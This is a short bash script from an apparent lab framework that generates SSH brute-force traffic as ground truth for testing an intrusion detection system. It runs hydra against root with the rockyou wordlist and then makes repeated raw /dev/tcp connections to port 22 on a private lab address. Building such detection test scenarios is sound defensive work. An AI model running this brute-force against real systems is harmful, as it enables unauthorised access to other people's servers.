#!/bin/bash
# ARCHIVIRT campaign_v1 — SCN-002 SSH Brute-force (hydra). SINGLE SOURCE OF TRUTH.
# Runs ON the attacker (ansible -m script).
set -uo pipefail

TARGET="${ARCHIVIRT_SSH_TARGET:-10.0.2.12}"
WORDLIST="${ARCHIVIRT_WORDLIST:-/usr/share/wordlists/rockyou.txt}"
ts() { date -u +%Y-%m-%dT%H:%M:%S.%NZ; }

echo "ARCHIVIRT_SCENARIO=SCN-002"

if ! command -v hydra >/dev/null 2>&1; then
    echo "ARCHIVIRT_PREREQUISITE_MISSING=hydra"
    exit 0
fi
if [ ! -f "$WORDLIST" ]; then
    echo "ARCHIVIRT_PREREQUISITE_MISSING=wordlist:$WORDLIST"
    exit 0
fi

echo "ARCHIVIRT_ATTACK_START=$(ts)"
# Primary tool: hydra. NOTE: if the target enforces publickey-only auth, hydra
# aborts after one connection ("does not support password authentication"), so
# it cannot drive the brute-force by itself. We therefore ALSO generate the
# brute-force CONNECTION pattern the IDS keys on — repeated SSH TCP connection
# attempts to tcp/22 (strictly intra-lab, to the designated target). The
# measured ground-truth signal is the connection-rate pattern, not credential
# guessing (documented limitation when password auth is disabled server-side).
sudo timeout 90 hydra -l root -P "$WORDLIST" -t 4 -f "ssh://$TARGET" || true
for _i in $(seq 1 20); do
    timeout 2 bash -c "exec 3<>/dev/tcp/${TARGET}/22" 2>/dev/null && exec 3>&- 2>/dev/null || true
done
rc=0
echo "ARCHIVIRT_ATTACK_END=$(ts)"
echo "ARCHIVIRT_ATTACK_RC=$rc"
